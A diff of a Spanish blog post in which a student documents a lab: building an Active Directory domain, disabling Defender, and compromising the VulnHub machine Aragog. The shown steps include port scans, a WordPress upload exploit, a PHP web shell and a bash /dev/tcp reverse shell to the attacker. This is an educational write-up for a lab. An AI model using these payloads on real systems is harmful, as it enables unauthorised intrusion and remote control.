@@ -1,70 +1,75 @@
 ---
-title: "Proyecto de Síntesis GM (AD PWN)"
+title: "Auditoría de Active Directory y Pivoting (AD PWN)"
+date: 2024-06-15T01:00:00+02:00
+draft: false
 featureimage: "img/portada.jpg"
 showHero: true
-heroStyle: "basic"   #
-date: 2024-06-015T01:00:00+02:00
-draft: true
-description: "Guía completa para configurar una máquina virtual de Windows 11 en KVM/QEMU con Single GPU Passthrough, CPU Pinning y Hugepages en Arch Linux."
+heroStyle: "basic"
+description: "Auditoría completa de un entorno Active Directory con técnicas de Pivoting: desde el compromiso perimetral hasta el control total del dominio y persistencia con Golden Ticket."
 tags: [
-  "kvm",
-  "qemu",
-  "gpu-passthrough",
-  "vfio",
-  "arch-linux",
-  "windows11",
-  "gaming",
-  "virtualizacion",
-  "cpu-pinning",
-  "hugepages"
+  "active-directory",
+  "pivoting",
+  "pentesting",
+  "chisel",
+  "kerberos",
+  "responder",
+  "golden-ticket",
+  "ntlm-relay",
+  "mimikatz",
+  "impacket",
+  "cve-2024-21413",
+  "wordpress"
 ]
-categories: ["Virtualización", "Linux", "Gaming"]
+categories: ["Active Directory", "Pentesting", "Pivoting"]
 showTableOfContents: true
 ---
+
 ## INTRODUCCIÓN
 
-Bienvenidos, en esta documentación te presentaré mi proyecto de síntesis de CFGM-SMX, enfocado en el ámbito de la Ciberseguridad.
+Para mi proyecto final de síntesis de CFGM-SMX decidí meterme de lleno en el barro de la **ciberseguridad ofensiva** y montar un laboratorio para auditar dos conceptos clave: **Pivoting** y ataques contra **Active Directory (AD PWN)**.
 
-A lo largo de este trabajo te mostraré los objetivos, el desarrollo y las conclusiones obtenidas, con el fin de profundizar en la seguridad informática y la detección de vulnerabilidades.
+La idea era simular un entorno corporativo realista: una máquina perimetral expuesta al exterior con servicios web vulnerables, y detrás de ella, una red interna con un Domain Controller y clientes Windows completamente aislados de internet. A partir de ahí, el objetivo fue comprometer la máquina perimetral, pivotar hacia la red interna y escalar privilegios hasta hacerme con el control total del dominio y dejar persistencia.
 
-A lo largo de este proyecto tenemos 2 mayores objetivos :
+Mis dos grandes objetivos en este proyecto fueron:
 
-* Explorar en profundidad el concepto "*pivoting*" (en el campo de la ciberseguridad)
-* Ver vulnerabilidades que existen dentro de Active Directory
+* **Explorar el Pivoting en profundidad:** entender cómo usar un equipo comprometido como proxy para saltar entre segmentos de red a los que inicialmente no tengo acceso directo.
+* **Auditar y vulnerar Active Directory:** explotar fallos de configuración, ataques de credenciales (Kerberos, NTLM Relay) y crear persistencia mediante un Golden Ticket.
 
-Teniendo en cuenta estas 2 variables, tenemos que crear un laboratorio que se ajuste a estos parámetros. Construiremos el siguiente laboratorio:
+Teniendo esto en cuenta, construí el siguiente laboratorio:
 
-Empezando con la primera y unica máquina que es `externa` (descargada de [Vulnhub](https://vulnhub.com/)) , esta máquina perteneciente a la red de la empresa, tiene un servicio web, exponiendo el puerto 80. Después contamos con 4 máquinas mas, de estas 3 son win11 y la que queda es Windows Server. Como hemos indicado anteriormente al querer tener Active Directory en este contexto la máquina con Windows Server hace de Domain Controller (DC) y las 2 máquinas Windows 11 hacen de cliente al servidor. Adicionalmente destacar que el Domain Controller también le pusimos un servicio de correo (IMAP/POP3) para que haya correo en local.
+* **Aragog (Debian / VulnHub):** máquina perimetral con un servicio web en el puerto 80. Dispone de dos interfaces de red: una hacia mi red atacante y otra hacia la red corporativa interna.
+* **DC-Company (Windows Server 2016 Datacenter):** el Domain Controller (DC) de la empresa con servicios de Active Directory, DNS, DHCP y un servidor de correo local (hMailServer con IMAP/POP3).
+* **Clientes Windows:** puestos de trabajo clientes de Windows dentro del dominio `visma.local`.
 
-## GESTIÓN DEL PRYECTO
+## GESTIÓN DEL PROYECTO
 
 ### Sistemas operativos en la red objetivo
 
-* Como ya hemos contado anteriormente en la introducción, contamos con 5 máquinas en total, empezando con la máquina Aragog, esta es un servidor Debian descargado desde [Vulnhub](https://vulnhub.com/). Después contamos con 4 Máquinas dentro del Active Directory, donde se encuentran el Domain Controller (DC) con Windows server 2016 datacenter junto a 3 máquinas “clientes” con Windows 11 dentro del Dominio del Active Directory.
+* Como ya he comentado en la introducción, cuento con 5 máquinas en total: empezando con la máquina Aragog, esta es un servidor Debian descargado desde [Vulnhub](https://vulnhub.com/). Después contamos con 4 Máquinas dentro del Active Directory, donde se encuentran el Domain Controller (DC) con Windows server 2016 datacenter junto a 3 máquinas “clientes” con Windows 11 dentro del Dominio del Active Directory.
 
 ### Sistema operativo máquina principal
 
-* En este caso existe una 6a máquina, esta es nuestra máquina principal desde donde vamos a realizar las pruebas de penetración. En este caso contamos con Kali Linux (una distribución de Linux basada en Debian con muchas herramientas de ciberseguridad pre-instaladas). Escogimos esta ya que era la iso que ya venia descargada en los pc de clase y con algunas herramientas pre-instaladas que íbamos a utilizar (aunque el resto no lo utilicemos). Para darle algo de personalidad a la VM decidimos ir con un entorno personalizado, en este caso como gestor de ventanas utilizamos "BSPWM" junto a SXHKD como gestor de KEYBINDINGS y finalmente de terminal una kitty con zsh en vez de bash.
+* En este caso existe una 6a máquina, esta es mi máquina principal desde donde voy a realizar las pruebas de penetración. En este caso cuento con Kali Linux (una distribución de Linux basada en Debian con muchas herramientas de ciberseguridad pre-instaladas). Escogí esta ya que era la ISO que venía descargada en los PCs de clase y traía herramientas que iba a utilizar. Para darle algo de personalidad a la VM decidí ir con un entorno personalizado: **BSPWM** como gestor de ventanas, **sxhkd** para los keybindings y la terminal **Kitty** con **zsh** en vez de bash.
 
 ### Red
 
-* En este caso usaremos la “red de clase” ya que nuestra máquina atacante y la Aragog se encuentran en adaptador puente. La razón de esto es que simulan que la Aragog esta expuesta con un servicio Web a la GAN desde donde la máquina atacante es capaz de atacarla y entrar dentro del entorno empresarial.
+* Usé la red de clase configurando mi máquina atacante y la máquina Aragog en modo adaptador puente. La razón de esto es que simulan que la Aragog esta expuesta con un servicio Web a la GAN desde donde la máquina atacante es capaz de atacarla y entrar dentro del entorno empresarial.
 
-Una vez tenemos una idea de como es el entorno vamos a pasar a conceptos básicos para poder entender el proyecto.
+Una vez vista la idea del entorno, paso a los conceptos básicos para poder entender el proyecto.
 
 # Teoría
 
 ## Pivoting
 
-En primer lugar empezaremos explicando que es el pivoting. Dentro del entorno de la ciberseguridad el pivoting es una técnica donde se usa un equipo vulnerado como “proxy” para poder acceder a un segmento de red al cual nosotros Inicialmente no teníamos acceso, sea porque tiene 2 interfaces (poco habitual) o porque tiene acceso a otras VLANS.
+En primer lugar empezaré explicando qué es el pivoting. Dentro del entorno de la ciberseguridad el pivoting es una técnica donde se usa un equipo vulnerado como “proxy” para poder acceder a un segmento de red al cual inicialmente no tenía acceso, sea porque tiene 2 interfaces (poco habitual) o porque tiene acceso a otras VLANS.
 
-La victima al hacer de proxy nos permite redirigir todo el tráfico hacia (como ya hemos dicho) a otro segmento lo que hace que podamos vulnerar equipos a los que antes no llegábamos.
+La victima al hacer de proxy nos permite redirigir todo el tráfico hacia (como ya he dicho) a otro segmento lo que hace que podamos vulnerar equipos a los que antes no llegábamos.
 
 Aquí un apoyo visual sobre como se vería el Pivoting.
 
-<figure><img src="Pasted image 20261007104024.png" alt=""><figcaption><p>Aquí observamos como la máquina atacante se encuentra en una red distinta a la máquina Objetivo, pero el Pivote (que es una maquina del medio) tiene 2 interfaces de red, una en el mismo segmento de red que la máquina atacante y la otra en el mismo que la máquina objetivo. Por lo que si conseguimos vulnerar la máquina Pivote podemos llegar a acceder a la máquina objetivo.</p></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104024.png" alt=""><figcaption><p>Aquí observamos como la máquina atacante se encuentra en una red distinta a la máquina Objetivo, pero el Pivote (que es una maquina del medio) tiene 2 interfaces de red, una en el mismo segmento de red que la máquina atacante y la otra en el mismo que la máquina objetivo. Por lo que si conseguimos vulnerar la máquina Pivote podemos llegar a acceder a la máquina objetivo.</p></figcaption></figure>
 
-Una vez entendemos como funciona el Pivoting, pasamos a entender que es el Active Directory ya que es la siguiente fase.
+Una vez entendido cómo funciona el Pivoting, paso a explicar qué es Active Directory ya que es la siguiente fase.
 
 ## Active Directory
 
@@ -74,7 +79,7 @@ El DC es un Windows Server Datacenter al que se le instala el rol de *Active Dir
 
 Este también se ocupa de la autenticación, aunque normalmente lo hace por *Kerberos* pero si este servicio por alguna razón no se encuentra disponible usará el servicio *NTDS* para autenticarse.
 
-El servicio NTDS ocupa un archivo llamado NTDS.dit ara su funcionamiento, este archivo es donde se almacenan los hashes NTLM (contraseña del user cifrada) de todos los usuarios del dominio junto el grupo al que pertenecen. Por lo que es un archivo muy critico dentro del dominio como del sistema.
+El servicio NTDS ocupa un archivo llamado NTDS.dit para su funcionamiento, este archivo es donde se almacenan los hashes NTLM (contraseña del user cifrada) de todos los usuarios del dominio junto el grupo al que pertenecen. Por lo que es un archivo muy critico dentro del dominio como del sistema.
 
 ## Kerberos
 
@@ -82,7 +87,7 @@ El nombre de Kerberos procede de la mitología griega y hace referencia a Cerber
 
 Un "ticket" de Kerberos es un certificado digital, emitido por un servidor de autenticación y cifrado con la clave del servidor, que permite a los hosts demostrar su identidad entre sí de forma segura. Es lo que se conoce como autenticación mutua.
 
-Como hemos explicado anteriormente, Kerberos es un servicio que gestiona los inicios de sesión a otros servicios dentro del AD, por lo que así se vería un inicio de sesión a un servicio que este bajo el “control” del DC:
+Como he explicado anteriormente, Kerberos es un servicio que gestiona los inicios de sesión a otros servicios dentro del AD, por lo que así se vería un inicio de sesión a un servicio que este bajo el “control” del DC:
 
 * **Solicitud del Ticket TGT por parte del cliente**
   * El cliente solicita un Ticket Granting Ticket (TGT) para autenticarse en la red.
@@ -102,17 +107,17 @@ Como hemos explicado anteriormente, Kerberos es un servicio que gestiona los ini
 
 ## Golden Ticket Attack
 
-Una vez entendemos como funciona Kerberos, vamos a explicaros uno de los ataques que hemos hecho en este trabajo llamado Golden ticket attack.
+Una vez entendido cómo funciona Kerberos, paso a explicar uno de los ataques principales realizados en este trabajo: el **Golden Ticket Attack**.
 
 Este es un ataque donde el objetivo final es conseguir un Ticket de Concesión Kerberos (TGT) falsificado con la "firma" del servidor para obtener acceso sin restricciones a servicios o recursos dentro de un dominio Active Directory.
 
 De manera sencilla el proceso es algo por el estilo: Para ello primero necesitamos un usuario y contraseña validos en el dominio, después debemos extraer el hash utilizado por el sistema Kerberos para autenticar los tickets. Con la clave de KRBTGT en posesión, podemos generar un Golden Ticket falso.
 
-El Golden Ticket es un ticket de autenticación con una firma criptográfica válida, que nos permite hacernos pasar por cualquier usuario dentro del dominio, incluso uno con privilegios elevados, como un administrador.
+El Golden Ticket es un ticket de autenticación con una firma criptográfica válida, que permite hacerse pasar por cualquier usuario dentro del dominio, incluso uno con privilegios elevados, como un administrador.
 
 # Preparación del entorno
 
-Ya que tenemos los conceptos básicos del proyecto, vamos a preparar el entorno de Active directory, para ello empezaremos con un Windows Server Datacenter que tendrá el rol de Domain Controller dentro del Active Directory, seguido de las 3 máquinas win 10 que harán de clientes de este servidor. El Windows Server aparte de tener el rol de DC, también ofrecerá otros servicios como:
+Con la base teórica clara, pasé a preparar el laboratorio de Active Directory: un Windows Server Datacenter con el rol de Domain Controller (DC) y las máquinas clientes Windows. El Windows Server aparte de tener el rol de DC, también ofrecerá otros servicios como:
 
 * Correo
 * Servidor DHCP
@@ -122,34 +127,34 @@ Así que después de haber enumerado todos los servicios que ofrecerá, toca cre
 
 ## Crear máquinas
 
-En este caso utilizaremos un Windows Server 2016, pero la versión Datacenter. Y en nuestro caso le pondremos el nombre de máquina DC-Companny.
+En mi caso utilicé Windows Server 2016 Datacenter y le asigné el hostname `DC-Company`.
 
-* Le Ponemos 4gb de RAM, 2 núcleos y habilitamos el modo EFI.
-* De disco, ponemos el espacio correspondiente (en nuestro caso 400gb).
+* Le asigné 4 GB de RAM, 2 núcleos y habilité el modo EFI.
+* De disco le asigné 400 GB.
 
 Una vez tenemos esto, ya podemos iniciar la máquina virtual (si vamos a poner la MV en una red NAT o vamos a modificar la interfaz de red, antes de inicarla, modificarlo). Procedemos con la instalación normal, Al escoger la versión, debemos escoger la “Windows Server 2016 Datacenter Evaluation (Desktop Experience)”.
 
-<figure><img src="Pasted image 20261007104113.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104113.png" alt=""><figcaption></figcaption></figure>
 
 Una vez Instalado, nos pedirá poner una contraseña de administrador para la Máquina, se la indicamos y acabará de iniciar. Una vez acabe de iniciar, nos logueamos y nos aparecerá&#x20;
 
-<figure><img src="Pasted image 20261007104149.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104149.png" alt=""><figcaption></figcaption></figure>
 
 ## Instalando servicios
 
 Para poder instalar los servicios que necesitamos lo que haremos sera dirigirnos a manage > add roles and Features y desde ahí podremos instalar lo que necesitamos que en nuestro caso serian 3 servicos necesarios, active directory, dns y dhcp.
 
-<figure><img src="Pasted image 20261007104209.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104209.png" alt=""><figcaption></figcaption></figure>
 
 Aceptaremos todo y en el apartado de confirmación, confirmaremos pulsando “install”para así se instale lo escogido anteriormente.
 
 Una vez instalado nos saldrá de esta manera, ya podremos cerrarlo.
 
-Arriba a la derecha habrá una bandera el cual son las notificaciones, pulsaremos en ella y nos deberá salir un apartado el cual será el active directory, si pulsamos en él, nos llevará a la siguiente pestaña (lo que se muestra en imagen), crearemos nuestro propio dominio con el nombre que queramos.
+Arriba a la derecha habrá una bandera el cual son las notificaciones, pulsaremos en ella y nos deberá salir un apartado el cual será el active directory, si pulsamos en él, nos llevará a la siguiente pestaña (lo que se muestra en imagen), creé el dominio con el nombre `visma.local`.
 
-<figure><img src="Pasted image 20261007104226.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104226.png" alt=""><figcaption></figcaption></figure>
 
-Seguido nos pedirá una constraseña para nuestro dominio, tendremos que tener activado (en la misma pestaña) "Domain Name System (DNS) server" y "Global Catalog (GC)". En el apartado opción adicional, le pondremos el nombre de nuestro proyecto.
+Seguido nos pedirá una constraseña para nuestro dominio, tendremos que tener activado (en la misma pestaña) "Domain Name System (DNS) server" y "Global Catalog (GC)". En opciones adicionales le asigné el nombre NetBIOS correspondiente.
 
 Una vez aceptemos todo nos pedirá reiniciar la máquina, la reiniciamos.
 
@@ -157,7 +162,7 @@ Una vez aceptemos todo nos pedirá reiniciar la máquina, la reiniciamos.
 
 Para cambiar el nombre pc haremos click derecho en el símbolo de Windows de nuestra barra de tareas y nos dirigiremos a "System".
 
-<figure><img src="Pasted image 20261007104246.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104246.png" alt=""><figcaption></figcaption></figure>
 
 Nos saldrá una ventana con datos del sistema, deberemos darle a "Change settings".
 
@@ -165,74 +170,74 @@ Saltara otra ventana el cual para poder cambiarle el nombre deberemos pulsar en 
 
 ## Creación de usuarios AD
 
-Comenzaremos a crear los usuarios del active directory, para ello iremos a Tools > Active directory Users and Computers, nos saldrá una ventana tal y como se muestra en la imagen el cual haremos click derecho > users > new y crearemos los usuarios que necesitemos, con una contraseña sergura. Nosotros hemos creado el usuario de Ismail y Victoria como usuarios sin privilegios.
+Comencé creando los usuarios del Active Directory en Tools > Active Directory Users and Computers. Creé los usuarios estándar de pruebas con contraseñas seguras para simular cuentas de empleados sin privilegios.
 
-<figure><img src="Pasted image 20261007104304.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104304.png" alt=""><figcaption></figcaption></figure>
 
 ## Configuración del DHCP
 
-Para configurar el DHCP será importante tenerlo instalado como comentamos en el primer punto. Comenzaremos yendo a la bandera veremos la notificación del DHCP, cuando le demos a "complete DHCP configuration" se nos abrira una ventana, en autorizacion pondremos el nombre que queramos,en nuestro caso pusimos VISMA\Administrator, aceptamos y instalamos.
+Para configurar el DHCP será importante tenerlo instalado como comentamos en el primer punto. Comenzaremos yendo a la bandera veremos la notificación del DHCP, cuando le demos a "complete DHCP configuration" se nos abrira una ventana, en autorización autoricé con `VISMA\Administrator`, aceptamos y instalamos.
 
-<figure><img src="Pasted image 20261007104319.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104319.png" alt=""><figcaption></figcaption></figure>
 
-Seguido iremos a tolos > DHCP, entraremos abriremos las carpetas hasta entrar a iPv4, añadiremos una nueva ip comenzando por la ip 192.168.1.40 hasta la 192.168.1.200, con la máscara 255.255.255.0 pondremos 90 días, como router pondremos la ip 192.168.1.1 como name Domain pondremos el que pusimos al crear nuestro dominio visma.local
+Seguido fui a Tools > DHCP, entraremos abriremos las carpetas hasta entrar a iPv4, añadiremos una nueva ip comenzando por la ip 192.168.1.40 hasta la 192.168.1.200, con la máscara 255.255.255.0 pondremos 90 días, como router pondremos la ip 192.168.1.1 como name Domain pondremos el que pusimos al crear nuestro dominio visma.local
 
-<figure><img src="Pasted image 20261007104423.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104423.png" alt=""><figcaption></figcaption></figure>
 
 ## Installing hmailserver
 
 Para que todo vaya correctamente deberemos instalar una característica llamada ".NET Framework 3.5".
 
-<figure><img src="Pasted image 20261007104542.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104542.png" alt=""><figcaption></figcaption></figure>
 
-Una vez este instalada, iremos a nuestro navegador y instalaremos el hmailserver (url), cuando ya lo hayamos instalado, lo iniciaremos, nos pedirá una contraseña pondremos la que nosotros queramos , una vez dentro añadiremos un dominio, pondremos el dominio que creamos anteriormente en nuestro AD, pondremos usuarios lo que creamos anteriormente yendo a nuestro dominio Accounts > Add, pondremos el nombre que queramos pero es recomendable poner el de los usuarios que creamos en nuestro AD.
+Una vez este instalada, iremos a nuestro navegador y instalaremos el hmailserver (url), cuando ya lo hayamos instalado, lo iniciaremos, nos pedirá una contraseña pondremos la que nosotros queramos , una vez dentro añadiremos un dominio, pondremos el dominio que creamos anteriormente en nuestro AD, creé las cuentas de correo en Accounts > Add correspondientes a los usuarios del dominio.
 
-<figure><img src="Pasted image 20261007104558.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104558.png" alt=""><figcaption></figcaption></figure>
 
 ## Creando y configurando los clientes del AD DC
 
-Empezaremos creando las máquinas de cada usuario, omitimos la instalación desatendida para poder escoger la versión de Windows, ya que para poder ser clientes del AD, debemos contar con la versión profesional de Windows (Windows pro). La instalamos con las carateristicas que queramos, en nuestro caso al tener un ordenador estable le pusimos las siguientes características:
+A continuación creé las máquinas cliente con Windows Pro (necesario para unirse a un dominio de Active Directory):
 
-<figure><img src="Pasted image 20261007104612.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104612.png" alt=""><figcaption></figcaption></figure>
 
-Una vez tengamos la máquina la clonaremos identicamente para asi poder hacer la máquina del otro usuario. Una vez cloanda comenzaremos a instalarla, en nuestro caso le hemos puesto al nombre de equipo LocalAdmin, cuando acabemos de instalarla. Iniciar la terminal/cmd, pondremos ipconfig (comando el cual nos sirve para saber que ip tiene ) encontraremos que los 2 tienen la misma ip, si revisamos los dispositivos a los cuales el Windows server ha dado ip, solo nos aparece 1:
+Una vez lista la primera máquina, la cloné para tener el segundo equipo cliente. Al iniciar ambas y ejecutar `ipconfig` observé que ambas tenían exactamente la misma IP asignada por DHCP:
 
-<figure><img src="Pasted image 20261007104625.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104625.png" alt=""><figcaption></figcaption></figure>
 
 En lo que nos deberíamos fijar es en el “Unique ID”, este es la dirección MAC y es que al clonar las máquinas también se ha clonado la dirección MAC. Por lo que, para resolver este problema, simplemente debemos Apagar una máquina, entrar en configuración > red > Avanzado. Y aquí pedir otra MAC. Y ya está, se han cambiado solo las últimas 3 duplas de la dirección MAC, ya que las 3 primeras, hacen referencia al fabricante (Virtual box).
 
 Una vez tenemos esto, ya podemos inicar la máquina y ver que tenemos una dirección ip distinta y además nos aparece en “Adresses Leases” en el Win Server.
 
-<figure><img src="Pasted image 20261007104639.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104639.png" alt=""><figcaption></figcaption></figure>
 
 ### Añadir ordenadores al AD
 
 Para añadir ordenadores al AD, es decir, añadirles nuestro ddominio, deberemos dirijirnos a la confirguación de nuestra máquina, dentro de cuentas > Obtener acceso a trabajo o escuela, seleccionaremos conectar como nosotros no tendremos que poner un correo eléctronico sino un dominio, le daremos abajo, donde dice "UNir este dispositivo a un dominio local AD", pondremos nuestro dominio visma.local.
 
-<figure><img src="Pasted image 20261007104654.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104654.png" alt=""><figcaption></figcaption></figure>
 
-Pondremos el usuario que queramos poner en ese ordenador, es decir, si estamos poniendo el dominio en la máquina Isma, pondremos le usuario ismail, seguido el tipo de cuenta la dejaremos con administrador, y reiniciaremos, lo mismo haremos en con la otra máquina, Victoria.
+Añadí el equipo al dominio `visma.local` con las credenciales de usuario y reinicié el equipo, repitiendo el proceso para el resto de máquinas cliente.
 
-<figure><img src="Pasted image 20261007104706.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104706.png" alt=""><figcaption></figcaption></figure>
 
-Lo siguiente será quitar el antivirus de nuestras máquinas. Primero el del DC, para ello entramos en PowerShell ISE:
+Para las pruebas de laboratorio desactivé el antivirus para evitar interferencias en los payloads. Primero en el DC, para ello entramos en PowerShell ISE:
 
 ```powershell
 Uninstall-WindowsFeature -Name Windows-Defender
 ```
 
-<figure><img src="Pasted image 20261007104721.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104721.png" alt=""><figcaption></figcaption></figure>
 
-Para quitar el antivirus de nuestras máquinas usuarios nos dirigiremos a configuración > Actualización y seguridad > Seguridad win > Protección contra virus y amenazas > Admin de la configuración, lo desactivamos todo. Luego seguido para confirmarlo haremos win + r ponemos gpdit.msc, nos dirigimos a la carpeta, plantilla admin > antivirus win defender > veremos si esta desactivado al completo, en caso de que no lo desactivamos manualmente.
+En las máquinas cliente desactivé Windows Defender desde Configuración y a través de directivas locales (`gpedit.msc`).
 
-<figure><img src="Pasted image 20261007104732.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="img/Pasted image 20261007104732.png" alt=""><figcaption></figcaption></figure>
 
 # Ataque
 
-Una vez entendemos la teoría y tenemos el laboratorio preparado, es hora de empezar a vulnerar el entorno, empezando por la Aragog.
+Una vez listo el laboratorio, pasé a la fase de explotación comenzando por la máquina perimetral Aragog.
 ## Aragog
 
-Antes de nada como la maquina Aragog esta hecha para VirtualBox y como Hipervisor hemos usado VM Ware Workstation, las interfaces configuradas no son las correctas, por lo que como no sabemos la contraseña ni nada durante el arranque en grub, haciendo click a la letra `e` nos permite editar los comandos de GRUB, cerca del final aparece esta linea
+Como la máquina Aragog venía preparada para VirtualBox y en mi caso utilicé VMware Workstation, las interfaces de red no coincidían. Al no disponer de contraseñas, edité los parámetros de arranque en GRUB pulsando `e` para conseguir una shell root en el boot:
 
 ```bash
 linux /boot/vmlinuz-3.2.0-24-generic root=UUID=bc6f8146-1523-46a6-8b\
@@ -253,7 +258,7 @@ Pulsamos la tecla `F10` y nos dara una shell privilegiada sin acceso a internet.
 ### RED
 
 ```bash
-sudo nano /etc/network/interface
+sudo nano /etc/network/interfaces
 ```
 
 Nos tiene que quedar como se muestra la imagen.
@@ -263,19 +268,19 @@ Nos tiene que quedar como se muestra la imagen.
 En caso de que queramos saber que hemos puesto en la interface podemos utilizar el siguiente comando:
 
 ```bash
-cat /etc /network/interface
+cat /etc/network/interfaces
 ```
 
 Reiniciamos la maquina, y nos dirigimos a nuestra maquina principal es importante tener la Aragog encendida para que nos encuentre la ip, para saber que ip tiene escanearemos la red poniendo el siguiente comando:
 
 ```bash
-arp-scan -I ens33 –localnet 
+arp-scan -I ens33 --localnet 
 ```
 
 Si solamenente queremos buscar la maquina, y estamos usando VmWare podremos añadirle el comando `grep` y entre comillas pondremos lo siguiente:
 
 ```bash
-arp-scan -I ens33 –localnet | grep "VMware, Inc."
+arp-scan -I ens33 --localnet | grep "VMware, Inc."
 ```
 
 <figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FDhk0TXuK9O1kDbWQ4rRO%2Fimage.png?alt=media&amp;token=794185b8-e458-4e72-821e-7b1009610cda" alt=""><figcaption></figcaption></figure>
@@ -290,12 +295,12 @@ ping -c 1 IP_DE_LA_ARAGOG
 
 <figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F9DNe3YGkWT0LGokBg3D9%2Fimage.png?alt=media&amp;token=3ca3a9c7-408e-4154-91a0-2af76dc9cf19" alt=""><figcaption></figcaption></figure>
 
-Una vez le hemos mandado un ping, podemos revisar que la máquina esta encendida, también vemos que el ttl = 64 por lo que es una máquina Linux, si el ttl es “=” o menor a 64 quiere decir, que probablemente estamos ante una máquina Linux. Podemos observar también que ningún paquete a sido descartado, entonces ya sabemos que esta en el mismo segmento de red y esta preparada para ser vulnerada.
+Comprobé conectividad enviando una traza ICMP con `ping`: también vemos que el ttl = 64 por lo que es una máquina Linux, si el ttl es “=” o menor a 64 quiere decir, que probablemente estamos ante una máquina Linux. Podemos observar también que ningún paquete a sido descartado, entonces ya sabemos que esta en el mismo segmento de red y esta preparada para ser vulnerada.
 
 Una vez tengamos esa información, deberemos hacer un escaneo de puertos para ello utilizaremos la herramienta nmap, especializada en escanear puertos, pondremos parametros ya que queremos solamente cosas especificas. (si quieres saber sobre los parámetros entra aqui:.....)
 
 ```bash
-nmap -sS -p --open -T5 --min-rate 5000 IP_DE_LA_ARAGOG -n -Pn -vvv -oG
+nmap -sS -p- --open -T5 --min-rate 5000 IP_DE_LA_ARAGOG -n -Pn -vvv -oG allPorts
 ```
 
 <figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Fx0ueYlA2EVBWNunJNFgz%2Fimage.png?alt=media&amp;token=f6b7ae84-2889-4db8-96e6-ec0d2adfcdf5" alt=""><figcaption></figcaption></figure>
@@ -362,7 +367,7 @@ Para ver si tenemos directory listing, para poder tener directory listing en una
 Como lo que queríamos era buscar plugions de wordpress que fuesen vulnerables probaremos con otra herramienta llamada `WPscan`
 
 ```
--wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate u,vp --plugin-detection agressive --api-token=$wpapi
+wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate u,vp --plugins-detection aggressive
 ```
 
 Podemos encontrar que ha detectado varios plugins con vulnerabilidades, pero de todos esos el que mas me llama la atención es uno que me permite subir archivos de sin autenticarme y que de ahí puede derivar en una ejecución remota de comandos. En esta [web](https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9/) nos dejan un POC (proof of concept) donde entro de este tenemos el script en Python que nos permite subir archivos remotamente. Para descargarlo haremos un `wget` del archivo
@@ -383,7 +388,7 @@ Dónde agregaremos las siguientes líneas.
 
 ```
 <?php
-echo "<pre>" . shell.exec($_REQUEST['cmd']) . "</pre>";
+echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 ?>
 ```
 
@@ -402,7 +407,7 @@ Si entramos a la url : `http://wordpress.aragog.hogwarts/blog/wp-content/plugins
 Una vez hemos verificado que tiene 2 interfaces de red vamos a entablar una reverse Shell. Para ello nos vamos al puerto 443 y ponemos un one liner para una reverse Shell:
 
 ```
-bash -c "bash -i >& /dev/tcp/IP_DE_LA_ARAGOG/443 0>&1"
+bash -c "bash -i >& /dev/tcp/IP_ATACANTE/443 0>&1"
 ```
 
 Una vez ejecutamos el comando podemos observar que hemos obtenido una reverse shell
@@ -429,7 +434,8 @@ reset xterm
 Reseteamos la Variable de entrno TERM para que sea igual a “xterm”, xterm es un emulador de terminal muy utilizado que es el que nos permite limpiar pantalla con las hotkeys “ctrl + L” usar “ctrl + C”, poder usar las flechas para moverse, etc. ‎
 
 ```
-expot TERM=xterm s$ -sitty rows 64 columns 253wordpress/wp-content/plugins/wp-file-manager/lib/files
+export TERM=xterm
+stty rows 64 columns 253
 ```
 
 Una vez hecho eso reseteamos el tamaño de la terminal a nuestro tamaño de la ventana y ya está. Ya tenemos una reverse Shell totalmente interactiva que si hacemos “ctrl + c” no se nos cierra.
@@ -447,12 +453,12 @@ echo “texto en base 64” | base64 -d; echo
 Buscaremos si encontramos algo útil, como esta corriendo apache debemos buscar el directorio de apache que `“/etc/apache2”` una vez dentro encontramos que hay un directorio llamado `“sites-enabled”` entramos y dentro hay un wordpress.conf, al hacerle un `cat` nos revela que el directorio donde esta montado el wordpress es `“/usr/share/wordpress”` si entramos, encontramos que hay un direcorio interesante llamado `“wp-content”`, si entramos y nos dirigimos a `plugins>wp-file-manager>lib>files` encontramos nuestro `payload.php`, de momento no lo borraremos porque sin el no podemos tener la reverse Shell, pero una vez escalemos y tengamos conexión por ssh debemos borrarlo para dejar menos evidencias.
 
 ```
-cd /etc/apache2/sites/enabled
-cat worpress.conf
+cd /etc/apache2/sites-enabled
+cat wordpress.conf
 ```
 
 ```
-cd /usr/share/wordpress & ls
+cd /usr/share/wordpress && ls
 ```
 
 ```
@@ -462,7 +468,7 @@ cd /plugins/wp-file-manager/lib/files
